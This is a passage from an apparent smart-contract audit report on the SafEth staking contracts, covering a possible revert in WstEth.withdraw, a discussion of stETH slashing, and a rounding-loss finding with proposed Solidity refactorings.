class=\"mtk12\">stETH</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">stETHAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stETHAmount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>We then ask whether <code>stETH.getPooledEthByShares(1) == 0</code>. <a href=\"https://github.com/lidofinance/lido-dao/blob/df95e563445821988baf9869fde64d86c36be55f/contracts/0.4.24/StETH.sol#L315C14-L324\">StETH.getPooledEthByShares()</a> is:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"165\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getPooledEthByShares</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_sharesAmount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalShares</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getTotalShares</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">totalShares</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_sharesAmount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            .</span><span class=\"mtk11\">mul</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_getTotalPooledEther</span><span class=\"mtk1\">())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            .</span><span class=\"mtk11\">div</span><span class=\"mtk1\">(</span><span class=\"mtk12\">totalShares</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>So just like in M-02, if <code>_getTotalPooledEther() &#x3C; totalShares</code> then <code>IWStETH(WST_ETH).unwrap(1) == 0</code> and <code>WstEth.withdraw(1)</code> reverts.</p>\n<h3 id=\"recommended-mitigation-steps-22\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-22\" aria-label=\"recommended mitigation steps 22 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Replace <code>require(stEthAmount > 0, \"No stETH to unwrap\");</code> with <code>if (stEthAmount > 0) return;</code></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/70#issuecomment-1539079043\">toshiSat (Asymmetry) commented</a>:</strong></p>\n<blockquote>\n<p>In our remove derivative pr, we never call withdraw for a derivative contract that’s disabled.  </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/70#issuecomment-1540985244\">adriro (warden) commented</a>:</strong></p>\n<blockquote>\n<p>I thought of this case given the very good finding in M-02 and concluded that is not a valid scenario, realistically there’s no way that a positive amount of wstETH unwraps as zero amount of stETH. I think a low severity would be more appropriate. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/70#issuecomment-1542230649\">d3e4 (warden) commented</a>:</strong></p>\n<blockquote>\n<blockquote>\n<p><em>In our remove derivative pr, we never call withdraw for a derivative contract that’s disabled.</em></p>\n</blockquote>\n<p>See the MRs <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/15\"><code>#15</code></a>, <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/43\"><code>#43</code></a> and <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/63\"><code>#63</code></a> of M-02 for why disabling the derivative isn’t a full solution.</p>\n<blockquote>\n<p><em>I thought of this case given the very good finding in M-02 and concluded that is not a valid scenario, realistically there’s no way that a positive amount of wstETH unwraps as zero amount of stETH. I think a low severity would be more appropriate.</em></p>\n</blockquote>\n<p>I agree that it seems unlikely that <code>IWStETH(WST_ETH).unwrap(1) == 0</code> but I cannot see that it would be impossible. It’s also easy enough to fix.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/70#issuecomment-1544422219\">adriro (warden) commented</a>:</strong></p>\n<blockquote>\n<blockquote>\n<p><em>I agree that it seems unlikely that <code>IWStETH(WST_ETH).unwrap(1) == 0</code> but I cannot see that it would be impossible. It’s also easy enough to fix.</em></p>\n</blockquote>\n<p>wstETH is a wrapper around stETH which is a rebasing token. If you wrap 1 token then that will be always be unwrapped as at least 1 stETH, because stETH being a rebasing token it will be receiving ETH from staking rewards. This means that:</p>\n<ol>\n<li>Minting stETH increases  shares but also increases the ETH as the user needs to submit the ETH.</li>\n<li>When staking rewards are distributed in the contract ETH is only increased, not shares.</li>\n</ol>\n<p>I can’t see how <code>_getTotalPooledEther() &#x3C; totalShares</code> would hold.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/70#issuecomment-1544468846\">Picodes (judge) commented</a>:</strong></p>\n<blockquote>\n<p>@adriro - it is very unlikely but not impossible if for example staked ETH backing stETH are slashed, no? In this case <code>_getTotalPooledEther</code> would decrease.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/70#issuecomment-1544492124\">adriro (warden) commented</a>:</strong></p>\n<blockquote>\n<blockquote>\n<p><em>@adriro it is very unlikely but not impossible if for example staked ETH backing stETH are slashed, no? In this case <code>_getTotalPooledEther</code> would decrease.</em></p>\n</blockquote>\n<p>That’s an interesting point! </p>\n<p>I wasn’t referring to impossible (as something catastrophic may happen to Lido, in which case an admin action in SafEth would be more appropriate), but honestly I wasn’t considering slashing. That sounds a bit more likely.</p>\n<p>I’m ok then, given this reasoning, thanks for pointing this out. </p>\n</blockquote>\n<hr>\n<h2 id=\"medium-rounding-loss-in-and-with-approxprice\" style=\"position:relative;\"><a href=\"#medium-rounding-loss-in-and-with-approxprice\" aria-label=\"medium rounding loss in and with approxprice permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/71\">[Medium] Rounding loss in and with <code>approxPrice()</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/71\">d3e4</a>, also found by <a href=\"https://github.com/code-423n4/2023-05-asymmetry-mitigation-findings/issues/42\">adriro</a></em></p>\n<p><strong>Severity: Medium</strong></p>\n<p><code>https://github.com/asymmetryfinance/smart-contracts/blob/ec582149ae9733eed6b11089cd92ca72ee5425d6/contracts/SafEth/SafEth.sol#L87-L119></code><br>\n<code>https://github.com/asymmetryfinance/smart-contracts/blob/ec582149ae9733eed6b11089cd92ca72ee5425d6/contracts/SafEth/SafEth.sol#L359-L373</code></p>\n<h3 id=\"description-1\" style=\"position:relative;\"><a href=\"#description-1\" aria-label=\"description 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h3>\n<p><code>SafEth.approxPrice()</code>(<code>https://github.com/asymmetryfinance/smart-contracts/blob/ec582149ae9733eed6b11089cd92ca72ee5425d6/contracts/SafEth/SafEth.sol#L359-L373</code>) contains a rounding loss of the form <code>a/k + b/k &#x3C;= (a + b)/k</code> which can be refactored as follows:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"166\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">for (uint256 i = 0; i &lt; count; i++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    if (!derivatives[i].enabled) continue;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    IDerivative derivative = derivatives[i].derivative;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    underlyingValue +=</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-         (derivative.ethPerDerivative() * derivative.balance()) /</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-         1e18;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+         (derivative.ethPerDerivative() * derivative.balance())</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">if (safEthTotalSupply == 0 || underlyingValue == 0) return 1e18;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- return (1e18 * underlyingValue) / safEthTotalSupply;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ return underlyingValue / safEthTotalSupply;</span></span></span></code></pre>\n<p>But even with this refactoring, in <code>stake()</code> we have the line (<code>https://github.com/asymmetryfinance/smart-contracts/blob/ec582149ae9733eed6b11089cd92ca72ee5425d6/contracts/SafEth/SafEth.sol#L114</code>)<br>\n<code>mintedAmount = (totalStakeValueEth * 1e18) / preDepositPrice;</code><br>\nwhere <code>preDepositPrice = approxPrice()</code>, so this suffers a rounding loss of the form <code>a/(b/c) >= a*c/b</code>.<br>\nWe would want to refactor this line to<br>\n<code>mintedAmount = (totalStakeValueEth * 1e18 * safEthTotalSupply) / underlyingValue;</code>.</p>\n<p>We have another case of <code>a/k + b/k &#x3C;= (a + b)/k</code> in <code>stake()</code> (<code>https://github.com/asymmetryfinance/smart-contracts/blob/ec582149ae9733eed6b11089cd92ca72ee5425d6/contracts/SafEth/SafEth.sol#L98-L112</code>):</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"167\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">count</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">derivativeReceivedEthValue</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">derivative</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        .</span><span class=\"mtk11\">ethPerDerivative</span><span class=\"mtk1\">() * </span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">totalStakeValueEth</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">derivativeReceivedEthValue</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>So we can do the same here and defer the division by <code>1e18</code> to after the summation, which gives us</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"168\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">- mintedAmount = (totalStakeValueEth * 1e18 * safEthTotalSupply) / underlyingValue;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+ mintedAmount = (totalStakeValueEth * safEthTotalSupply) / underlyingValue;</span></span></span></code></pre>\n<h3 id=\"recommendation-8\" style=\"position:relative;\"><a href=\"#recommendation-8\" aria-label=\"recommendation 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Do the above refactoring in <code>approxPrice()</code>. This function is still needed to estimate <code>_minOut</code>.<br>\nNote that <code>approxPrice()</code> is calculated anew in the emitted event at the end of <code>stake()</code> (<code>https://github.com/asymmetryfinance/smart-contracts/blob/ec582149ae9733eed6b11089cd92ca72ee5425d6/contracts/SafEth/SafEth.sol#L118</code>). This means that this was not the price paid for the stake just made, but the price to pay for the next stake. It seems more appropriate to emit the price just paid, and this would also save gas by just reusing the already calculated price.</p>\n<p>As for <code>stake()</code>, the rounding loss would have to be eliminated by inlining the calculation. Note that the two for-loops may also be combined. Here is a complete refactoring:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"169\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">stake</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_minOut</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mintedAmount</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(!</span><span class=\"mtk12\">pauseStaking</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;staking is paused&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">minAmount</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;amount too low&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">maxAmount</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;amount too high&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">totalWeight</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;total weight is zero&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">count</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">derivativeCount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">underlyingValue</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalStakeValueEth</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// total amount of derivatives staked by user in eth</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">count</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">IDerivative</span><span class=\"mtk1\"> </span><span class=\"mtk12\">derivative</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">derivative</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk12\">derivative</span><span class=\"mtk1\">.</span><span class=\"mtk12\">enabled</span><span class=\"mtk1\">) </span><span class=\"mtk15\">continue</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">underlyingValue</span><span class=\"mtk1\"> += (</span><span class=\"mtk12\">derivative</span><span class=\"mtk1\">.</span><span class=\"mtk11\">ethPerDerivative</span><span class=\"mtk1\">() * </span><span class=\"mtk12\">derivative</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balance</span><span class=\"mtk1\">()); </span><span class=\"mtk3\">// 36 decimals</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">weight</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">weight</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">weight</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk15\">continue</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethAmount</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">weight</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">totalWeight</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">ethAmount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// This is slightly less than ethAmount because slippage</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">derivative</span><span class=\"mtk1\">.</span><span class=\"mtk12\">deposit</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">ethAmount</span><span class=\"mtk1\">}();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">derivativeReceivedEthValue</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">derivative</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                .</span><span class=\"mtk11\">ethPerDerivative</span><span class=\"mtk1\">() * </span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">totalStakeValueEth</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">derivativeReceivedEthValue</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// 36 decimals</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// mintedAmount represents a percentage of the total assets in the system</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">safEthTotalSupply</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">mintedAmount</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">safEthTotalSupply</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">underlyingValue</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ? </span><span class=\"mtk12\">totalStakeValueEth</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        : </span><span class=\"mtk12\">totalStakeValueEth</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">safEthTotalSupply</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">underlyingValue</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mintedAmount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">_minOut</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;mint amount less than minOut&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">mintedAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Staked</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">, </span><span class=\"mtk12\">totalStakeValueEth</span><span class=\"mtk1\">, </span><span class=\"mtk11\">approxPrice</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>where, following the discussion above, the last part may be replaced with</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"170\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">preDepositPrice</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> 